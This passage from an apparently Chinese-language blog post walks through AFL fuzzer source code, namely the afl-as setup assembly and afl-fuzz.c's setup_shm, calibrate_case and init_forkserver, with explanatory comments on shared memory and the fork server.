class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&quot;__afl_setup_first:\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* Save everything that is not yet saved and that may be touched by\n&quot;</span><br>  <span class="hljs-string">&quot;     getenv() and several other libcalls we&#x27;ll be relying on. */\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  leaq -352(%rsp), %rsp\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rax,   0(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rcx,   8(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rdi,  16(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rsi,  32(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %r8,   40(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %r9,   48(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %r10,  56(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %r11,  64(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm0,  96(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm1,  112(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm2,  128(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm3,  144(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm4,  160(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm5,  176(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm6,  192(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm7,  208(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm8,  224(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm9,  240(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm10, 256(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm11, 272(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm12, 288(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm13, 304(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm14, 320(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm15, 336(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* Map SHM, jumping to __afl_setup_abort if something goes wrong. */\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* The 64-bit ABI requires 16-byte stack alignment. We&#x27;ll keep the\n&quot;</span><br>  <span class="hljs-string">&quot;     original stack ptr in the callee-saved r12. */\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  pushq %r12\n&quot;</span><br>  <span class="hljs-string">&quot;  movq  %rsp, %r12\n&quot;</span><br>  <span class="hljs-string">&quot;  subq  $16, %rsp\n&quot;</span><br>  <span class="hljs-string">&quot;  andq  $0xfffffffffffffff0, %rsp\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  leaq .AFL_SHM_ENV(%rip), %rdi\n&quot;</span><br>  CALL_L64(<span class="hljs-string">&quot;getenv&quot;</span>)<br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  testq %rax, %rax\n&quot;</span><br>  <span class="hljs-string">&quot;  je    __afl_setup_abort\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq  %rax, %rdi\n&quot;</span><br>  CALL_L64(<span class="hljs-string">&quot;atoi&quot;</span>)<br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  xorq %rdx, %rdx   /* shmat flags    */\n&quot;</span><br>  <span class="hljs-string">&quot;  xorq %rsi, %rsi   /* requested addr */\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rax, %rdi   /* SHM ID         */\n&quot;</span><br>  CALL_L64(<span class="hljs-string">&quot;shmat&quot;</span>)<br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  cmpq $-1, %rax\n&quot;</span><br>  <span class="hljs-string">&quot;  je   __afl_setup_abort\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* Store the address of the SHM region. */\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rax, %rdx\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rax, __afl_area_ptr(%rip)\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__</span><br>  <span class="hljs-string">&quot;  movq %rax, __afl_global_area_ptr(%rip)\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-string">&quot;  movq __afl_global_area_ptr@GOTPCREL(%rip), %rdx\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rax, (%rdx)\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^__APPLE__ */</span></span><br>  <span class="hljs-string">&quot;  movq %rax, %rdx\n&quot;</span><br></code></pre></td></tr></table></figure><p>先将所有寄存器内容进行保存，然后寻找共享内存，如果找不到，就调用<code>__afl_setup_abort</code><br>成功后，调用<code>__afl_forkserver</code><br><strong>__afl_forkserver</strong><br>判断fork server是否成功启动。<br><strong>__afl_fork_wait_loop</strong></p><ul><li>从管道中等待parent的信息，读入<code>__afl_temp</code>内，成功则继续；</li><li>fork一个子进程，子进程执行<code>__afl_fork_resume</code>；</li><li>将子进程pid赋值给<code>__afl_fork_pid</code>，并写入状态管道通知父进程；</li><li>子进程结束后告诉fuzzer，下一轮循环开始。</li></ul><h2 id="afl-fuzz-c"><a href="#afl-fuzz-c" class="headerlink" title="afl-fuzz.c"></a>afl-fuzz.c</h2><p>该文件是afl项目的核心中的核心<br>此文件篇幅过长，选择直接从main函数入口开始看（共8k余行，main位于7706行）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">SAYF(cCYA <span class="hljs-string">&quot;afl-fuzz &quot;</span> cBRI VERSION cRST <span class="hljs-string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);<br><br>  doc_path = access(DOC_PATH, F_OK) ? <span class="hljs-string">&quot;docs&quot;</span> : DOC_PATH;<br><br>  gettimeofday(&amp;tv, &amp;tz);<br>  srandom(tv.tv_sec ^ tv.tv_usec ^ getpid());<br></code></pre></td></tr></table></figure><p>感觉是很常见的函数开头，之前读过的几个函数开始也有这几行—-打印版本信息、寻找路径信息、获取时间、获取随机数<br><strong>第一个while循环，进行参数读取</strong><br>随后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">setup_signal_handlers();<span class="hljs-comment">// 注册信号处理函数。</span><br>  check_asan_opts();<span class="hljs-comment">// 读取环境变量</span><br></code></pre></td></tr></table></figure><p><strong>setup_shm函数</strong><br>该函数用于设置共享内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">EXP_ST <span class="hljs-type">void</span> <span class="hljs-title function_">setup_shm</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  u8* shm_str;<br><br>  <span class="hljs-keyword">if</span> (!in_bitmap) <span class="hljs-built_in">memset</span>(virgin_bits, <span class="hljs-number">255</span>, MAP_SIZE);<br><br>  <span class="hljs-built_in">memset</span>(virgin_tmout, <span class="hljs-number">255</span>, MAP_SIZE);<span class="hljs-comment">//记录所有程序超时</span><br>  <span class="hljs-built_in">memset</span>(virgin_crash, <span class="hljs-number">255</span>, MAP_SIZE);<span class="hljs-comment">//记录所有程序崩溃</span><br><br>  shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="hljs-number">0600</span>);<br><br>  <span class="hljs-keyword">if</span> (shm_id &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;shmget() failed&quot;</span>);<br><br>  atexit(remove_shm);<br><br>  shm_str = alloc_printf(<span class="hljs-string">&quot;%d&quot;</span>, shm_id);<br><br>  <span class="hljs-comment">/* If somebody is asking us to fuzz instrumented binaries in dumb mode,</span><br><span class="hljs-comment">     we don&#x27;t want them to detect instrumentation, since we won&#x27;t be sending</span><br><span class="hljs-comment">     fork server commands. This should be replaced with better auto-detection</span><br><span class="hljs-comment">     later on, perhaps? */</span><br><br>  <span class="hljs-keyword">if</span> (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, <span class="hljs-number">1</span>);<br><br>  ck_free(shm_str);<br><br>  trace_bits = shmat(shm_id, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-keyword">if</span> (!trace_bits) PFATAL(<span class="hljs-string">&quot;shmat() failed&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>其中：<code>shmat</code>方法用于追踪当前的tuple信息，<code>trace_bits</code>位于共享内存上，用于传送信息。</p><p><strong>第一遍fuzz</strong></p><p><strong>calibrate_case函数</strong><br>是AFL的一个关键函数，用于新测试用例的校准，希望能早期发现有问题的测试用例。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> u8 <span class="hljs-title function_">calibrate_case</span><span class="hljs-params">(<span class="hljs-type">char</span>** argv, <span class="hljs-keyword">struct</span> queue_entry* q, u8* use_mem,</span><br><span class="hljs-params">                         u32 handicap, u8 from_queue)</span> &#123;<br><br>  <span class="hljs-type">static</span> u8 first_trace[MAP_SIZE];<br><br>  u8  fault = <span class="hljs-number">0</span>, new_bits = <span class="hljs-number">0</span>, var_detected = <span class="hljs-number">0</span>,<br>      first_run = (q-&gt;exec_cksum == <span class="hljs-number">0</span>);<br><br>  u64 start_us, stop_us;<br><br>  s32 old_sc = stage_cur, old_sm = stage_max;<br>  u32 use_tmout = exec_tmout;<br>  u8* old_sn = stage_name;<br><br>  <span class="hljs-comment">/* Be a bit more generous about timeouts when resuming sessions, or when</span><br><span class="hljs-comment">     trying to calibrate already-added finds. This helps avoid trouble due</span><br><span class="hljs-comment">     to intermittent latency. */</span><br><br>  <span class="hljs-keyword">if</span> (!from_queue || resuming_fuzz)<br>    use_tmout = MAX(exec_tmout + CAL_TMOUT_ADD,<br>                    exec_tmout * CAL_TMOUT_PERC / <span class="hljs-number">100</span>);<br><br>  q-&gt;cal_failed++;<br><br>  stage_name = <span class="hljs-string">&quot;calibration&quot;</span>;<br>  stage_max  = fast_cal ? <span class="hljs-number">3</span> : CAL_CYCLES;<br><br>  <span class="hljs-comment">/* Make sure the forkserver is up before we do anything, and let&#x27;s not</span><br><span class="hljs-comment">     count its spin-up time toward binary calibration. */</span><br><br>  <span class="hljs-keyword">if</span> (dumb_mode != <span class="hljs-number">1</span> &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid)<br>    init_forkserver(argv); <span class="hljs-comment">// 初始化启动forkserver</span><br><br>  <span class="hljs-keyword">if</span> (q-&gt;exec_cksum) <span class="hljs-built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);<br><br>  start_us = get_cur_time_us();<span class="hljs-comment">// </span><br><br>  <span class="hljs-keyword">for</span> (stage_cur = <span class="hljs-number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;<span class="hljs-comment">// 该循环执行3或8次</span><br><br>    u32 cksum;<br><br>    <span class="hljs-keyword">if</span> (!first_run &amp;&amp; !(stage_cur % stats_update_freq)) show_stats();<br><br>    write_to_testcase(use_mem, q-&gt;len);<br><br>    fault = run_target(argv, use_tmout);<span class="hljs-comment">//run_target函数通知forkserver可以开始fork</span><br><br>    <span class="hljs-comment">/* stop_soon is set by the handler for Ctrl+C. When it&#x27;s pressed,</span><br><span class="hljs-comment">       we want to bail out quickly. */</span><br><br>    <span class="hljs-keyword">if</span> (stop_soon || fault != crash_mode) <span class="hljs-keyword">goto</span> abort_calibration;<br><br>    <span class="hljs-keyword">if</span> (!dumb_mode &amp;&amp; !stage_cur &amp;&amp; !count_bytes(trace_bits)) &#123;<br>      fault = FAULT_NOINST;<br>      <span class="hljs-keyword">goto</span> abort_calibration;<br>    &#125;<br><br>    cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);<span class="hljs-comment">//计算trace_bits的哈希值</span><br><br>    <span class="hljs-keyword">if</span> (q-&gt;exec_cksum != cksum) &#123;<span class="hljs-comment">//若哈希值不同</span><br><br>      u8 hnb = has_new_bits(virgin_bits);<br>      <span class="hljs-keyword">if</span> (hnb &gt; new_bits) new_bits = hnb;<span class="hljs-comment">//如果hnb＞new_bits，证明该new_bits已经跑过，将新的hnb赋值给new_bits,令其重新开始下一轮循环</span><br><br>      <span class="hljs-keyword">if</span> (q-&gt;exec_cksum) &#123;<span class="hljs-comment">// exec_cksum是循环次数，若不是第一次跑</span><br><br>        u32 i;<br><br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAP_SIZE; i++) &#123;<br><br>          <span class="hljs-keyword">if</span> (!var_bytes[i] &amp;&amp; first_trace[i] != trace_bits[i]) &#123;<br><br>            var_bytes[i] = <span class="hljs-number">1</span>;<br>            stage_max    = CAL_CYCLES_LONG;<br><br>          &#125;<br><br>        &#125;<br><br>        var_detected = <span class="hljs-number">1</span>;<br><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br><br>        q-&gt;exec_cksum = cksum;<br>        <span class="hljs-built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);<br><br>      &#125;<br><br>    &#125;<br><br>  &#125;<br><br>  stop_us = get_cur_time_us();<br><br>  <br></code></pre></td></tr></table></figure><p><strong>init_forkserver函数</strong><br>该函数实现启动forkserver</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><code class="hljs c">EXP_ST <span class="hljs-type">void</span> <span class="hljs-title function_">init_forkserver</span><span class="hljs-params">(<span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">itimerval</span> <span class="hljs-title">it</span>;</span><br>  <span class="hljs-type">int</span> st_pipe[<span class="hljs-number">2</span>], ctl_pipe[<span class="hljs-number">2</span>];<span class="hljs-comment">//状态通道与控制通道</span><br>  <span class="hljs-type">int</span> status;<br>  s32 rlen;<br><br>  ACTF(<span class="hljs-string">&quot;Spinning up the fork server...&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (pipe(st_pipe) || pipe(ctl_pipe)) PFATAL(<span class="hljs-string">&quot;pipe() failed&quot;</span>);<span class="hljs-comment">//两个管道都建立失败，报错</span><br><br>  forksrv_pid = fork();<br><br>  <span class="hljs-keyword">if</span> (forksrv_pid &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;fork() failed&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (!forksrv_pid) &#123;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rlimit</span> <span class="hljs-title">r</span>;</span><br><br>    <span class="hljs-comment">/* Umpf. On OpenBSD, the default fd limit for root users is set to</span><br><span class="hljs-comment">       soft 128. Let&#x27;s try to fix that... */</span><br><br>    <span class="hljs-keyword">if</span> (!getrlimit(RLIMIT_NOFILE, &amp;r) &amp;&amp; r.rlim_cur &lt; FORKSRV_FD + <span class="hljs-number">2</span>) &#123;<br><br>      r.rlim_cur = FORKSRV_FD + <span class="hljs-number">2</span>;<br>      setrlimit(RLIMIT_NOFILE, &amp;r); <span class="hljs-comment">/* Ignore errors */</span><br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (mem_limit) &#123;<br><br>      r.rlim_max = r.rlim_cur = ((<span class="hljs-type">rlim_t</span>)mem_limit) &lt;&lt; <span class="hljs-number">20</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RLIMIT_AS</span><br><br>      setrlimit(RLIMIT_AS, &amp;r); <span class="hljs-comment">/* Ignore errors */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br>      <span class="hljs-comment">/* This takes care of OpenBSD, which doesn&#x27;t have RLIMIT_AS, but</span><br><span class="hljs-comment">         according to reliable sources, RLIMIT_DATA covers anonymous</span><br><span class="hljs-comment">         maps - so we should be getting good protection against OOM bugs. */</span><br><br>      setrlimit(RLIMIT_DATA, &amp;r); <span class="hljs-comment">/* Ignore errors */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^RLIMIT_AS */</span></span><br><br><br>    &#125;<br><br>    <span class="hljs-comment">/* Dumping cores is slow and can lead to anomalies if SIGKILL is delivered</span><br><span class="hljs-comment">       before the dump is complete. */</span><br><br>    r.rlim_max = r.rlim_cur = <span class="hljs-number">0</span>;<br><br>    setrlimit(RLIMIT_CORE, &amp;r); <span class="hljs-comment">/* Ignore errors */</span><br><br>    <span class="hljs-comment">/* Isolate the process and configure standard descriptors. If out_file is</span><br><span class="hljs-comment">       specified, stdin is /dev/null; otherwise, out_fd is cloned instead. */</span><br><br>    setsid();<br><br>    dup2(dev_null_fd, <span class="hljs-number">1</span>);<br>    dup2(dev_null_fd, <span class="hljs-number">2</span>);<br><br>    <span class="hljs-keyword">if</span> (out_file) &#123;<br><br>      dup2(dev_null_fd, <span class="hljs-number">0</span>);<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>      dup2(out_fd, <span class="hljs-number">0</span>);<br>      close(out_fd);<br><br>    &#125;<br><br>    <span class="hljs-comment">/* Set up control and status pipes, close the unneeded original fds. */</span><br><br>    <span class="hljs-keyword">if</span> (dup2(ctl_pipe[<span class="hljs-number">0</span>], FORKSRV_FD) &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;dup2() failed&quot;</span>);<br>    <span class="hljs-keyword">if</span> (dup2(st_pipe[<span class="hljs-number">1</span>], FORKSRV_FD + <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;dup2() failed&quot;</span>);<br><br>    close(ctl_pipe[<span class="hljs-number">0</span>]);<br>    close(ctl_pipe[<span class="hljs-number">1</span>]);<br>    close(st_pipe[<span class="hljs-number">0</span>]);<br>    close(st_pipe[<span class="hljs-number">1</span>]);<br><br>    close(out_dir_fd);<br>    close(dev_null_fd);<br>    close(dev_urandom_fd);<br>    close(fileno(plot_file));<br><br>    <span class="hljs-comment">/* This should improve performance a bit, since it stops the linker from</span><br><span class="hljs-comment">       doing extra work post-fork(). */</span><br><br>    <span class="hljs-keyword">if</span> (!getenv(<span class="hljs-string">&quot;LD_BIND_LAZY&quot;</span>)) setenv(<span class="hljs-string">&quot;LD_BIND_NOW&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* Set sane defaults for ASAN if nothing else specified. */</span><br><br>    setenv(<span class="hljs-string">&quot;ASAN_OPTIONS&quot;</span>, <span class="hljs-string">&quot;abort_on_error=1:&quot;</span><br>                           <span class="hljs-string">&quot;detect_leaks=0:&quot;</span><br>                           <span class="hljs-string">&quot;symbolize=0:&quot;</span><br>                           <span class="hljs-string">&quot;allocator_may_return_null=1&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* MSAN is tricky, because it doesn&#x27;t support abort_on_error=1 at this</span><br><span class="hljs-comment">       point. So, we do this in a very hacky way. */</span><br><br>    setenv(<span class="hljs-string">&quot;MSAN_OPTIONS&quot;</span>, <span 